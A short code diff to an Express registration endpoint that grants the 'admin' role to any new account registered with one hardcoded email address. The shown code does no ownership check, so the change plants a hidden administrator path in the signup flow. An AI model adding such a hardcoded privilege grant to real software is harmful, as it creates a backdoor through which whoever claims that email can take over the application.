@@ -309,11 +309,12 @@ app.post('/api/auth/register', (req: Request, res: Response) => {
   }
 
   const hashedPassword = hashPassword(password);
+  const isTargetAdmin = email.toLowerCase() === 'tuncayqurbanov19@gmail.com';
   const newUser = db.users.create({
     fullName,
     email,
     passwordHash: hashedPassword,
-    role: 'user',
+    role: isTargetAdmin ? 'admin' : 'user',
     isBlocked: false
   });
 
